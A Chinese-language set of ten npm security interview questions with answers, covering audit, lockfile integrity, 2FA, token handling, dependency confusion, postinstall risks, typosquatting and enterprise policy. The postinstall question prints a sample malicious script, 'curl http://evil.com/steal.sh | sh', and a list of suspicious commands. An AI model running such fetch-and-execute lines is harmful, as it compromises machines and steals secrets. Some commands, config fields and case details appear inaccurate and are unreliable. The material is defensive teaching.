# 第 12 章：npm 安全性 - 面试题

**难度分布：** 🟢 简单 x3 | 🟡 中等 x4 | 🔴 困难 x3

---

## 第 1 题 🟢

**类型：** 单选题  
**标签：** audit基础

### 题目

`npm audit` 命令的作用是什么？

**选项：**
- A. 审查代码质量
- B. 检查依赖包的安全漏洞
- C. 审计包大小
- D. 检查性能问题

<details>
<summary>查看答案</summary>

### ✅ 正确答案：B

### 📖 解析

**npm audit 命令**

```bash
npm audit

# 输出：
found 3 vulnerabilities (1 moderate, 2 high)
  run `npm audit fix` to fix them
```

**扫描依赖树中的已知安全漏洞**

#### 漏洞级别

```
Low        # 低危
Moderate   # 中危
High       # 高危
Critical   # 严重
```

#### 详细报告

```bash
npm audit

# 输出示例：
┌───────────────┬──────────────────────────────────────────────────────────────┐
│ Moderate      │ Regular Expression Denial of Service                        │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Package       │ minimatch                                                    │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Patched in    │ >=3.0.5                                                      │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Dependency of │ webpack                                                      │
├───────────────┼──────────────────────────────────────────────────────────────┤
│ Path          │ webpack > micromatch > braces > snapdragon > source-map-resolve > resolve-url > minimatch │
└───────────────┴──────────────────────────────────────────────────────────────┘
```

#### JSON 输出

```bash
npm audit --json > audit-report.json
```

</details>

---

## 第 2 题 🟢

**类型：** 判断题  
**标签：** package-lock完整性

### 题目

package-lock.json 包含 `integrity` 字段用于验证包的完整性。

**选项：**
- A. ✅ 正确
- B. ❌ 错误

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A

### 📖 解析

**integrity 字段**

```json
{
  "dependencies": {
    "lodash": {
      "version": "4.17.21",
      "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
      "integrity": "sha512-v2kDEe57lecTulaDIuNTPy3Ry4gLGJ6Z1O3vE1krgXZNrsQ+LFTGHVxVjcXPs17LhbZVGedAJv8XZ1tvj5FvSg=="
    }
  }
}
```

**integrity = SHA-512 哈希值**

#### 工作原理

```bash
npm install lodash

# 1. 下载 lodash-4.17.21.tgz
# 2. 计算 SHA-512
# 3. 对比 lock 文件中的 integrity
# 4. 如果不匹配 → 报错（包被篡改）
```

#### 安全保障

```bash
# 场景：恶意镜像源篡改包
npm install

# npm 验证：
# ✓ 计算下载文件的哈希
# ✓ 对比 integrity 值
# ✗ 不匹配 → 拒绝安装

npm ERR! Integrity check failed
```

**防止中间人攻击和包篡改**

</details>

---

## 第 3 题 🟢

**类型：** 单选题  
**标签：** 双因素认证

### 题目

如何为 npm 账号启用双因素认证（2FA）？

**选项：**
- A. npm config set 2fa=true
- B. npm profile enable-2fa
- C. 在 npmjs.com 网站设置
- D. B 和 C 都可以

<details>
<summary>查看答案</summary>

### ✅ 正确答案：D

### 📖 解析

**2FA 配置方法**

#### 方法 1：命令行

```bash
npm profile enable-2fa auth-and-writes

# 提示：
# 1. 扫描二维码
# 2. 输入验证码
# 3. 备份恢复码
```

**2FA 模式：**
- `auth-only`：仅登录时需要
- `auth-and-writes`：登录和发布都需要（推荐）

#### 方法 2：网站

```
1. 登录 npmjs.com
2. Settings → Account
3. Enable 2FA
4. 扫描二维码
```

#### 使用 2FA

**发布时：**
```bash
npm publish

# 提示输入 OTP（一次性密码）
This operation requires a one-time password.
Enter OTP: 123456
```

**或使用参数：**
```bash
npm publish --otp=123456
```

</details>

---

## 第 4 题 🟡

**类型：** 多选题  
**标签：** 安全最佳实践

### 题目

以下哪些是 npm 安全最佳实践？

**选项：**
- A. 定期运行 npm audit
- B. 使用 npm ci 而不是 npm install
- C. 启用 2FA
- D. 使用 .npmrc 存储 token

<details>
<summary>查看答案</summary>

### ✅ 正确答案：A、B、C

### 📖 解析

**npm 安全最佳实践**

#### A. 定期审计 ✅

```bash
# CI/CD 中
npm audit

# 设置阈值
npm audit --audit-level=moderate
# 有 moderate 以上漏洞时失败
```

**package.json：**
```json
{
  "scripts": {
    "preinstall": "npm audit",
    "security-check": "npm audit --production"
  }
}
```

#### B. 使用 npm ci ✅

```bash
# ✅ CI 环境
npm ci
# - 严格按 lock 文件
# - 不会安装意外的包
# - 防止依赖投毒

# ❌ 避免
npm install
# - 可能更新依赖
# - 引入未测试的版本
```

#### C. 启用 2FA ✅

```bash
npm profile enable-2fa auth-and-writes

# 防止账号被盗用发布恶意包
```

#### D. 存储 token ❌ 不安全

**错误做法：**
```ini
# .npmrc
//registry.npmjs.org/:_authToken=npm_xxxxxxxxxxxxx  # ❌ 危险
```

**正确做法：**
```ini
# .npmrc（提交到 Git）
//registry.npmjs.org/:_authToken=${NPM_TOKEN}  # ✅ 使用环境变量
```

**.gitignore：**
```
.npmrc  # 如果包含敏感信息
```

#### 其他最佳实践

**1. 最小权限原则：**
```bash
# 为 CI 创建只读 token
npm token create --read-only
```

**2. 依赖锁定：**
```json
{
  "dependencies": {
    "lodash": "4.17.21"  // 精确版本（关键依赖）
  }
}
```

**3. 使用 npm ignore：**
```
# .npmignore
.env
.git
tests/
*.test.js
```

**4. 检查 package.json：**
```bash
npm pkg get scripts
# 检查是否有可疑脚本
```

</details>

---

## 第 5 题 🟡

**类型：** 代码分析题  
**标签：** 依赖混淆攻击

### 题目

什么是依赖混淆攻击（Dependency Confusion）？

**选项：**
- A. 安装了错误的包版本
- B. 公共 npm 上传与内部包同名的恶意包
- C. 依赖树过于复杂
- D. package.json 配置错误

<details>
<summary>查看答案</summary>

### ✅ 正确答案：B

### 📖 解析

**依赖混淆攻击**

#### 攻击场景

**公司内部包：**
```json
{
  "name": "company-utils",  // 私有包
  "version": "1.0.0"
}
```

**攻击者在公共 npm：**
```bash
# 创建同名包
npm publish company-utils

# 发布更高版本
{
  "name": "company-utils",
  "version": "99.0.0"  // 很高的版本号
}
```

**受害者安装：**
```bash
npm install company-utils

# npm 选择：
# 私有源：1.0.0
# 公共源：99.0.0  ← 选中（版本更高）

# 安装了恶意包！
```

#### 防护措施

**1. 使用作用域包：**
```json
{
  "name": "@company/utils",  // ✅ 作用域包
  "version": "1.0.0"
}
```

**公共 npm 无法发布 @company 作用域的包**

**2. 配置 .npmrc：**
```ini
# 作用域包使用私有源
@company:registry=https://npm.company.com

# 公共包使用官方源
registry=https://registry.npmjs.org
```

**3. package-lock.json 锁定：**
```json
{
  "dependencies": {
    "company-utils": {
      "version": "1.0.0",
      "resolved": "https://npm.company.com/company-utils/-/company-utils-1.0.0.tgz"
    }
  }
}
```

**resolved 字段确保从正确的源安装**

**4. 使用 Verdaccio 代理：**
```yaml
# config.yaml
packages:
  '@company/*':
    access: $authenticated
    publish: $authenticated
  
  '**':
    access: $all
    proxy: npmjs
```

#### 真实案例

**2021 年安全研究员 Alex Birsan：**
- 发现 35+ 公司存在此漏洞
- 上传测试包到公共 npm
- 被下载超过 100 万次
- 获得 $130,000 漏洞赏金

</details>

---

## 第 6 题 🟡

**类型：** 单选题  
**标签：** postinstall脚本

### 题目

为什么 postinstall 脚本可能存在安全风险？

**选项：**
- A. 脚本执行太慢
- B. 可以执行任意代码
- C. 会修改 package.json
- D. 占用磁盘空间

<details>
<summary>查看答案</summary>

### ✅ 正确答案：B

### 📖 解析

**postinstall 脚本风险**

#### 恶意示例

```json
{
  "name": "malicious-package",
  "scripts": {
    "postinstall": "curl http://evil.com/steal.sh | sh"
  }
}
```

**安装时自动执行：**
```bash
npm install malicious-package

# 自动运行 postinstall
# 可能：
# - 窃取环境变量（包括 token）
# - 上传源代码
# - 植入后门
# - 挖矿
```

#### 真实攻击案例

**event-stream 事件（2018）：**
```json
{
  "scripts": {
    "postinstall": "node ./scripts/inject.js"
  }
}
```

**inject.js：**
```javascript
// 检测是否在特定应用中
if (process.env.npm_package_name === 'copay-wallet') {
  // 注入代码窃取比特币私钥
  const malicious = require('flatmap-stream');
  // ...
}
```

**影响：**
- 200+ 万次下载
- 窃取比特币钱包私钥

#### 防护措施

**1. 审查依赖：**
```bash
npm ls --depth=0
# 查看直接依赖

npm ls --all
# 查看所有依赖（包括传递依赖）
```

**2. 禁用脚本（不推荐）：**
```bash
npm install --ignore-scripts

# 问题：某些包需要构建脚本
```

**3. 使用 npm config：**
```bash
npm config set ignore-scripts true

# 全局禁用（可能破坏某些包）
```

**4. Socket.dev / Snyk 扫描：**
```bash
npx socket npm install lodash

# 分析包行为：
# ✓ 网络请求
# ✓ 文件系统访问
# ✓ Shell 命令执行
```

**5. 审查 scripts：**
```bash
npm pkg get scripts

# 检查可疑命令：
# - curl, wget
# - eval
# - 混淆代码
```

</details>

---

## 第 7 题 🟡

**类型：** 代码输出题  
**标签：** token管理

### 题目

以下哪种方式存储 npm token 最安全？

**选项：**
- A. .npmrc 文件
- B. package.json
- C. 环境变量
- D. 代码中

<details>
<summary>查看答案</summary>

### ✅ 正确答案：C

### 📖 解析

**token 存储方式对比**

#### A. .npmrc ⚠️ 需谨慎

```ini
# ~/.npmrc（用户级，相对安全）
//registry.npmjs.org/:_authToken=npm_xxxx

# ./.npmrc（项目级，危险）
//registry.npmjs.org/:_authToken=npm_xxxx  # ❌ 可能提交到 Git
```

#### B. package.json ❌ 极度危险

```json
{
  "config": {
    "token": "npm_xxxx"  // ❌ 千万不要
  }
}
```

**会被发布到 npm！**

#### C. 环境变量 ✅ 最安全

**.npmrc：**
```ini
//registry.npmjs.org/:_authToken=${NPM_TOKEN}
```

**使用：**
```bash
export NPM_TOKEN=npm_xxxx
npm install
```

**CI/CD：**
```yaml
# GitHub Actions
- name: Publish
  run: npm publish
  env:
    NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

#### D. 代码中 ❌ 极度危险

```javascript
const token = 'npm_xxxx';  // ❌ 绝对不要
```

#### 完整最佳实践

**本地开发：**
```ini
# ~/.npmrc（全局配置）
//registry.npmjs.org/:_authToken=npm_local_token
```

**团队协作：**
```ini
# .npmrc（提交到 Git）
//registry.npmjs.org/:_authToken=${NPM_TOKEN}

# .npmrc.example
//registry.npmjs.org/:_authToken=YOUR_TOKEN_HERE
```

**.gitignore：**
```
.npmrc  # 如果包含 token
```

**CI/CD：**
```bash
# 使用加密的环境变量
NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

**token 类型：**
```bash
# 1. 发布 token（最小权限）
npm token create --read-only

# 2. 限制 IP
npm token create --cidr=192.168.1.0/24

# 3. 设置过期时间
npm token create --expires=2024-12-31
```

</details>

---

## 第 8 题 🔴

**类型：** 综合分析题  
**标签：** 供应链攻击

### 题目

如何防范 npm 供应链攻击？

**选项：**
- A. 只使用知名的包
- B. 审查所有依赖的代码
- C. 使用 lockfile、audit、SCA 工具组合
- D. 不使用第三方包

<details>
<summary>查看答案</summary>

### ✅ 正确答案：C

### 📖 解析

**供应链攻击防御策略**

#### 多层防护

**1. Lock 文件 ✅**

```bash
npm ci  # 严格按 lock 文件安装

# package-lock.json 包含：
# - 精确版本
# - integrity 哈希
# - resolved URL
```

**防止意外更新到恶意版本**

**2. npm audit ✅**

```bash
# CI 中强制检查
npm audit --audit-level=moderate

# 或使用 npm audit signatures（npm 8.13+）
npm audit signatures
# 验证包签名
```

**3. SCA 工具（软件成分分析）✅**

**Socket.dev：**
```bash
npx socket npm install

# 检测：
# - 网络请求
# - Shell 命令
# - 混淆代码
# - 安装脚本
```

**Snyk：**
```bash
npx snyk test

# 检测：
# - 已知漏洞
# - 许可证合规
# - 依赖风险
```

**4. 依赖审查**

```bash
# 查看依赖树
npm ls

# 检查包信息
npm view package-name

# 查看维护者
npm view package-name maintainers

# 查看下载量
npm view package-name downloads
```

**5. Subresource Integrity**

```json
{
  "dependencies": {
    "lodash": "4.17.21"
  },
  "overrides": {
    "lodash": {
      ".": "4.17.21",
      "integrity": "sha512-specific-hash"
    }
  }
}
```

#### 完整防护方案

```yaml
# .github/workflows/security.yml
name: Security Checks

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      # 1. 安装依赖（使用 lock）
      - run: npm ci
      
      # 2. 审计漏洞
      - run: npm audit --audit-level=high
      
      # 3. Socket 扫描
      - uses: SocketDev/socket-security-action@v1
        with:
          api-key: ${{ secrets.SOCKET_KEY }}
      
      # 4. Snyk 测试
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      
      # 5. 许可证检查
      - run: npx license-checker --production --onlyAllow "MIT;Apache-2.0;ISC"
```

**package.json 配置：**

```json
{
  "scripts": {
    "preinstall": "npx npm-force-resolutions",
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "check:licenses": "license-checker --production",
    "check:deps": "npm outdated",
    "security": "npm run audit && npm run check:licenses"
  },
  "resolutions": {
    "lodash": "4.17.21",
    "minimist": "^1.2.6"
  }
}
```

</details>

---

## 第 9 题 🔴

**类型：** 场景题  
**标签：** typosquatting

### 题目

什么是 typosquatting 攻击？如何防范？

<details>
<summary>查看答案</summary>

### ✅ 答案

**Typosquatting（域名抢注）攻击**

#### 攻击原理

**正常包：**
```
lodash
react
express
```

**恶意包（拼写相似）：**
```
lodahs    ← typo
reactt    ← 多一个字母
expres    ← 少一个字母
express.js ← 添加后缀
1odash    ← 数字替换
```

**开发者误装：**
```bash
npm install reactt  # typo!
# 安装了恶意包
```

#### 真实案例

**crossenv vs cross-env（2017）：**
```bash
# 正确的包
npm install cross-env

# 恶意包
npm install crossenv  # 少一个 -

# crossenv 的 postinstall：
# 窃取环境变量并上传
```

#### 防护措施

**1. 仔细检查包名：**
```bash
# 安装前确认
npm view package-name

# 检查：
# - 维护者
# - 下载量
# - 最后更新时间
# - GitHub 仓库
```

**2. 使用 IDE 自动补全：**
```bash
# VSCode 会显示包的信息
# - 下载量
# - 描述
# - 版本
```

**3. 审查 package.json：**
```json
{
  "dependencies": {
    "lodash": "^4.17.21"  // ✅ 检查拼写
  }
}
```

**4. 使用 typosquatting 检测工具：**
```bash
npx @npm/detect-typosquatting
```

**5. CI 中验证：**
```yaml
- name: Check for typosquatting
  run: |
    npm ls --json | \
    npx @npm/detect-typosquatting
```

### 📖 解析

**完整防护策略**

#### package.json 审查清单

```bash
# 1. 检查包名拼写
cat package.json | jq '.dependencies | keys[]'

# 2. 对比官方文档
# lodash.com → "lodash"
# react.dev → "react"

# 3. 检查包来源
npm view package-name repository

# 4. 验证维护者
npm view package-name maintainers
```

#### 自动化检查

```javascript
// scripts/check-typos.js
const packages = require('../package.json').dependencies;
const knownGood = {
  'lodash': true,
  'react': true,
  'express': true
};

const suspect = Object.keys(packages).filter(pkg => {
  // 检查是否与已知包相似
  return !knownGood[pkg] && isSimilar(pkg, Object.keys(knownGood));
});

if (suspect.length > 0) {
  console.error('可疑的包名:', suspect);
  process.exit(1);
}
```

</details>

---

## 第 10 题 🔴

**类型：** 代码实现题  
**标签：** 安全策略

### 题目

如何实现企业级 npm 安全策略？

<details>
<summary>查看答案</summary>

### ✅ 答案

**企业级 npm 安全架构**

#### 1. 私有 Registry（Verdaccio）

```yaml
# config.yaml
storage: ./storage

auth:
  htpasswd:
    file: ./htpasswd

uplinks:
  npmjs:
    url: https://registry.npmjs.org/

packages:
  '@company/*':
    access: $authenticated
    publish: $authenticated
    unpublish: $authenticated
  
  '*':
    access: $all
    publish: $authenticated
    proxy: npmjs
    
    # 安全策略
    max_body_size: 10mb
```

#### 2. 包审批流程

```javascript
// scripts/package-approval.js
const approvedPackages = require('./approved-packages.json');

function checkPackage(name, version) {
  const approved = approvedPackages[name];
  
  if (!approved) {
    throw new Error(`包 ${name} 未经审批`);
  }
  
  if (!approved.versions.includes(version)) {
    throw new Error(`版本 ${version} 未经审批`);
  }
  
  return true;
}
```

**approved-packages.json：**
```json
{
  "lodash": {
    "approved_by": "security-team",
    "approved_date": "2023-01-15",
    "versions": ["4.17.21"],
    "security_check": "passed"
  }
}
```

#### 3. 安全扫描流程

```yaml
# .github/workflows/security.yml
name: Security Pipeline

on:
  pull_request:
    paths:
      - 'package.json'
      - 'package-lock.json'

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      # 1. 依赖审批检查
      - name: Check Approved Packages
        run: node scripts/check-approved.js
      
      # 2. 漏洞扫描
      - name: Vulnerability Scan
        run: |
          npm audit --audit-level=moderate
          npm audit signatures
      
      # 3. 许可证合规
      - name: License Check
        run: |
          npx license-checker --production \
            --onlyAllow "MIT;Apache-2.0;ISC;BSD-3-Clause"
      
      # 4. 行为分析
      - name: Socket Security
        uses: SocketDev/socket-security-action@v1
      
      # 5. SBOM 生成
      - name: Generate SBOM
        run: |
          npm sbom --sbom-format=cyclonedx > sbom.json
      
      # 6. 上传报告
      - name: Upload Security Report
        uses: actions/upload-artifact@v3
        with:
          name: security-report
          path: |
            sbom.json
            audit-report.json
```

#### 4. 企业 .npmrc 模板

```ini
# 强制使用私有 registry
registry=https://npm.company.com

# 作用域包配置
@company:registry=https://npm.company.com

# 安全配置
audit=true
audit-level=moderate
ignore-scripts=false

# 强制使用 lock 文件
package-lock=true
package-lock-only=false

# 不允许降级安装
force=false
legacy-peer-deps=false

# 使用环境变量存储 token
//npm.company.com/:_authToken=${NPM_TOKEN}
```

#### 5. CI/CD 集成

```dockerfile
# Dockerfile
FROM node:18-alpine

# 1. 安装安全工具
RUN npm install -g \
    npm-audit-resolver \
    license-checker \
    snyk

# 2. 复制配置
COPY .npmrc.example .npmrc

# 3. 安全安装
COPY package*.json ./
RUN npm ci --only=production

# 4. 验证
RUN npm audit --audit-level=moderate && \
    npm audit signatures && \
    license-checker --production --summary

# 5. 复制代码
COPY . .

CMD ["node", "server.js"]
```

### 📖 解析

**安全策略总结**

| 层级 | 措施 | 工具 |
|------|------|------|
| **预防** | 包审批、白名单 | 自定义脚本 |
| **检测** | 漏洞扫描、行为分析 | audit, Socket, Snyk |
| **控制** | 私有 registry、代理 | Verdaccio, Artifactory |
| **审计** | SBOM、日志 | npm sbom, 日志系统 |
| **响应** | 自动修复、告警 | audit fix, 监控 |

**实施步骤：**
1. 搭建私有 registry
2. 建立包审批流程
3. 集成安全扫描工具
4. 制定安全策略
5. 培训开发团队
6. 持续监控和改进

</details>

---

**导航**  
[上一章：第 11 章面试题](./chapter-11.md) | [返回目录](../README.md) | [下一章：第 13 章面试题](./chapter-13.md)
